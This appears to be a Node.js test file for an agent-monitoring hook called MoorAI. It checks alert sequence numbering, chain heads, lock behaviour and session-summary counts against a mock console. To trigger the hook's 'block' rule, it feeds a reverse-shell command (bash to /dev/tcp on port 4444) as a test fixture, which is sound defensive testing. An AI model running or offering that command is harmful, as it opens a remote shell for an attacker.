// Trust-anchor design phase 1D: per-device alert seq, the record-chain head, and the session summary's
// alertsEmitted / alertsDeferred, pinned to the contract the console (RAISEME-server evidence-ingest.js)
// builds against:
//   1. seq is one counter per device per OS user, strictly +1 per alert;
//   2. seq is taken only by alerts handed to the console (posted now, or queued and posted later by the
//      alertpost worker, keeping the number it was given); an unenrolled device takes none;
//   3. alertsEmitted counts the session's alerts that carry its `session` key, not the summary itself.
//
//   node --test --import ./test/hermetic-env.mjs test/alert-evidence.test.mjs
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawn, spawnSync } from "node:child_process";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, utimesSync, existsSync, symlinkSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import http from "node:http";
import { stampAlertSeq } from "../cli/alert-seq.mjs";
import { rmTree } from "./fs-cleanup.mjs";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");
const HOOK = join(ROOT, "cli", "moorai-hook.mjs");
const PKG_VERSION = JSON.parse(readFileSync(join(ROOT, "package.json"), "utf8")).version;
const SHELL = "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1"; // #54, built-in "block"
const SUMMARY = "Agent session summary";
const SEQ_URL = new URL("../cli/alert-seq.mjs", import.meta.url).href;
const STALL = pathToFileURL(join(ROOT, "test", "fixtures", "alert-seq-stall.mjs")).href;
const stampScript = (dir, tag) => `const { stampAlertSeq } = await import(${JSON.stringify(SEQ_URL)});
  console.log(JSON.stringify(stampAlertSeq({ tag: ${JSON.stringify(tag)} }, { tenant: "t", dir: ${JSON.stringify(dir)} }).seq ?? null));`;

test("stampAlertSeq: +1 per alert, a hex chain head, and parallel stampers never share a number", async () => {
  const dir = mkdtempSync(join(tmpdir(), "moorai-seq-"));
  try {
    const a = stampAlertSeq({ category: "x" }, { tenant: "t", dir });
    const b = stampAlertSeq({ category: "y" }, { tenant: "t", dir });
    assert.equal(b.seq, a.seq + 1);
    assert.match(a.chainHead, /^[0-9a-f]{64}$/);
    assert.notEqual(a.chainHead, b.chainHead);
    // 8 processes x 10 alerts at once: 80 distinct, contiguous numbers.
    // A stamper that cannot get the lock within its wait budget (a loaded machine) takes no number (null
    // here), so the numbers that were taken are what is checked: distinct and contiguous whatever the load.
    const worker = `const { stampAlertSeq } = await import(${JSON.stringify(SEQ_URL)});
      const out = []; for (let i = 0; i < 10; i++) out.push(stampAlertSeq({ i }, { tenant: "t", dir: ${JSON.stringify(dir)} }).seq ?? null); console.log(JSON.stringify(out));`;
    const runs = await Promise.all(Array.from({ length: 8 }, () => new Promise((res, rej) => {
      const c = spawn(process.execPath, ["--input-type=module", "-e", worker]);
      let out = "", err = ""; c.stdout.on("data", (d) => (out += d)); c.stderr.on("data", (d) => (err += d));
      c.on("close", (code) => { try { res(JSON.parse(out)); } catch { rej(new Error(`stamper exited ${code}: ${out} ${err}`)); } });
    })));
    const all = runs.flat().filter((s) => s !== null).sort((x, y) => x - y);
    assert.ok(all.length > 0 && all.every(Number.isSafeInteger), `stamped: ${runs.flat()}`);
    assert.equal(new Set(all).size, all.length, `duplicates: ${all}`);
    assert.equal(all[all.length - 1] - all[0], all.length - 1, `contiguous: ${all}`);
    assert.equal(all[0], b.seq + 1);
  } finally { rmTree(dir); }
});

// A child that takes the alert lock and stalls inside the advance (test/fixtures/alert-seq-stall.mjs) for
// `ms`. Resolves once the holder is inside, to { done }, which resolves to the seq the holder was given.
async function stalledHolder(dir, ms) {
  const mark = join(dir, "holder-stalled");
  const c = spawn(process.execPath, ["--import", STALL, "--input-type=module", "-e", stampScript(dir, "holder")], {
    env: { ...process.env, MOORAI_TEST_STALL_MS: String(ms), MOORAI_TEST_STALL_MARK: mark }
  });
  let out = ""; c.stdout.on("data", (d) => (out += d));
  const done = new Promise((res) => c.on("close", () => res(JSON.parse(out))));
  assert.ok(await until(() => existsSync(mark), 10000), "the holder never reached the advance");
  return { done };
}

test("stampAlertSeq: a stamper that cannot get the lock in time takes no number, never the one a stalled holder is about to write", async () => {
  const dir = mkdtempSync(join(tmpdir(), "moorai-seq-stall-"));
  try {
    const holder = await stalledHolder(dir, 3000);
    const late = stampAlertSeq({ category: "late" }, { tenant: "t", dir });
    const held = await holder.done;
    assert.equal(held, 1);
    assert.equal(late.seq, undefined, `the late stamper took ${late.seq} while the holder held ${held}`);
    assert.equal(late.chainHead, undefined);
    assert.equal(stampAlertSeq({ category: "after" }, { tenant: "t", dir }).seq, held + 1);
  } finally { rmTree(dir); }
});

test("stampAlertSeq: a lock that looks stale is not broken while the process holding it is alive; a dead holder's is", async () => {
  const dir = mkdtempSync(join(tmpdir(), "moorai-seq-steal-"));
  const lock = join(dir, ".chain-alerts.lock");
  try {
    const holder = await stalledHolder(dir, 3000);
    const old = (Date.now() - 30000) / 1000;
    utimesSync(lock, old, old);
    const late = stampAlertSeq({ category: "late" }, { tenant: "t", dir });
    const held = await holder.done;
    assert.equal(held, 1);
    assert.equal(late.seq, undefined, `the late stamper broke a live holder's lock and took ${late.seq} while the holder held ${held}`);
    // A crashed holder: its pid is gone and its lock is older than the stale age, so the next stamper breaks it.
    const gone = spawnSync(process.execPath, ["-e", "process.stdout.write(String(process.pid))"], { encoding: "utf8" }).stdout;
    writeFileSync(lock, gone);
    utimesSync(lock, old, old);
    assert.equal(stampAlertSeq({ category: "after" }, { tenant: "t", dir }).seq, held + 1);
    assert.ok(!existsSync(lock), "the lock is released");
  } finally { rmTree(dir); }
});

test("stampAlertSeq: a lock path that is a dangling symlink or a directory costs at most the wait budget, never a hang", { skip: process.platform === "win32" && "symlinks need privileges on Windows" }, () => {
  for (const kind of ["dangling symlink", "old directory"]) {
    const dir = mkdtempSync(join(tmpdir(), "moorai-seq-odd-"));
    const lock = join(dir, ".chain-alerts.lock");
    try {
      if (kind === "dangling symlink") symlinkSync(join(dir, "nowhere"), lock);
      else { mkdirSync(lock); const t = (Date.now() - 120000) / 1000; utimesSync(lock, t, t); }
      const t0 = Date.now();
      const r = spawnSync(process.execPath, ["--input-type=module", "-e", stampScript(dir, kind)], { timeout: 10000, encoding: "utf8" });
      assert.equal(r.signal, null, `${kind}: the stamp never returned (killed after ${Date.now() - t0} ms)`);
      assert.equal(r.status, 0, `${kind}: ${r.stderr}`);
    } finally { rmTree(dir); }
  }
});

// A console whose /api/policy can be made to drop the connection (no HTTP answer at all): the hook then
// defers that invocation's alerts to the detached alertpost worker, which posts them with their seq.
async function consoleServer() {
  const alerts = [];
  const state = { dropPolicy: false };
  const srv = http.createServer((req, res) => {
    let body = "";
    req.on("data", (d) => (body += d));
    req.on("end", () => {
      if (req.method === "POST") { try { if (req.url === "/api/alerts") alerts.push(JSON.parse(body)); } catch { /* ignore */ } res.writeHead(201); return res.end("{}"); }
      if (state.dropPolicy) return req.socket.destroy(); // policy and pubkey alike: no HTTP answer at all
      if (req.url.startsWith("/api/policy/pubkey")) { res.writeHead(404); return res.end(); }
      if (req.url.startsWith("/api/policy")) {
        res.writeHead(200, { "content-type": "application/json" }); return res.end(JSON.stringify({ captureTier: "content-free" }));
      }
      res.writeHead(404); res.end();
    });
  });
  await new Promise((r) => srv.listen(0, "127.0.0.1", r));
  return { url: `http://127.0.0.1:${srv.address().port}`, alerts, state, close: () => new Promise((r) => srv.close(r)) };
}
function runHook(home, payload) {
  const proj = join(home, "proj");
  return new Promise((res) => {
    const c = spawn(process.execPath, [HOOK], { cwd: proj, env: { PATH: process.env.PATH || "/usr/bin:/bin", HOME: home, USERPROFILE: home, CLAUDE_PROJECT_DIR: proj, XDG_CONFIG_HOME: join(home, ".config"), XDG_STATE_HOME: join(home, ".local", "state") } });
    let out = "", err = "";
    c.stdout.on("data", (d) => (out += d)); c.stderr.on("data", (d) => (err += d));
    c.on("close", (status) => res({ status, out, err }));
    c.stdin.end(JSON.stringify({ session_id: "sess-evidence", cwd: proj, ...payload }));
  });
}
const pre = { hook_event_name: "PreToolUse", tool_name: "Bash", tool_input: { command: SHELL } };
async function until(fn, ms = 15000) { const end = Date.now() + ms; while (Date.now() < end) { if (fn()) return true; await new Promise((r) => setTimeout(r, 100)); } return fn(); }

test("E2E: alerts across two calls, a deferred call and Stop carry seq n, n+1, … with no gap; alertsEmitted / alertsDeferred match what the console received for the session", async () => {
  const c = await consoleServer();
  const home = mkdtempSync(join(tmpdir(), "moorai-evidence-"));
  try {
    mkdirSync(join(home, ".moorai"), { recursive: true });
    mkdirSync(join(home, "proj"), { recursive: true });
    writeFileSync(join(home, ".moorai", "config.json"), JSON.stringify({ serverUrl: c.url, tenant: "acme", installToken: "tok-evidence" }));
    const cache = join(home, ".moorai", "hook-policy.json");
    const age = () => { const t = (Date.now() - 3600000) / 1000; try { utimesSync(cache, t, t); } catch { /* none yet */ } };

    for (let i = 0; i < 2; i++) { const r = await runHook(home, pre); assert.equal(r.status, 0, r.err); }
    const direct = c.alerts.length;
    assert.ok(direct >= 2, `expected at least one alert per call: ${direct}`);

    // Third call: the policy fetch gets no HTTP answer, so this call's alerts go to the alertpost worker.
    age();
    c.state.dropPolicy = true;
    assert.equal((await runHook(home, pre)).status, 0);
    assert.ok(await until(() => c.alerts.length > direct), "the deferred alerts never arrived");
    // The worker posts its batch in parallel: wait until nothing new has arrived for a second.
    for (let n = -1; n !== c.alerts.length;) { n = c.alerts.length; await new Promise((r) => setTimeout(r, 1000)); }
    const deferred = c.alerts.length - direct;
    c.state.dropPolicy = false;
    // Call 3 recorded a console back-off; clear it so Stop fetches and posts directly, and every deferred
    // alert in this session is one of call 3's.
    rmTree(join(home, ".moorai", "hook-console-backoff.json"));

    age();
    assert.equal((await runHook(home, { hook_event_name: "Stop", last_assistant_message: "done" })).status, 0);
    assert.ok(await until(() => c.alerts.some((a) => a.category === SUMMARY)), "no session summary");

    const seqs = c.alerts.map((a) => a.seq);
    assert.ok(seqs.every((s) => Number.isSafeInteger(s) && s > 0), `every alert carries a seq: ${seqs}`);
    const sorted = [...seqs].sort((x, y) => x - y);
    assert.equal(new Set(sorted).size, sorted.length, `no number twice: ${sorted}`);
    assert.equal(sorted[sorted.length - 1] - sorted[0], sorted.length - 1, `no gap: ${sorted}`);
    for (const a of c.alerts) {
      assert.match(a.chainHead, /^[0-9a-f]{64}$/);
      assert.equal(a.appVersion, PKG_VERSION, "appVersion is MoorAI's own version");
    }

    const summary = c.alerts.find((a) => a.category === SUMMARY);
    const session = summary.session;
    assert.ok(session, "the summary carries the session key");
    const counted = c.alerts.filter((a) => a.category !== SUMMARY && a.session === session);
    assert.equal(summary.summary.alertsEmitted, counted.length, `alertsEmitted ${summary.summary.alertsEmitted} vs ${counted.length} received with the session key`);
    assert.equal(summary.summary.alertsDeferred, deferred, `alertsDeferred ${summary.summary.alertsDeferred} vs ${deferred} posted by the worker`);
    assert.ok(deferred >= 1);
  } finally { await c.close(); rmTree(home); }
});

test("E2E: an unenrolled device posts nothing and takes no sequence number", async () => {
  const home = mkdtempSync(join(tmpdir(), "moorai-evidence-u-"));
  try {
    mkdirSync(join(home, "proj"), { recursive: true });
    assert.equal((await runHook(home, pre)).status, 0);
    assert.ok(!existsSync(join(home, ".moorai", ".chain-alerts.head.json")));
  } finally { rmTree(home); }
});
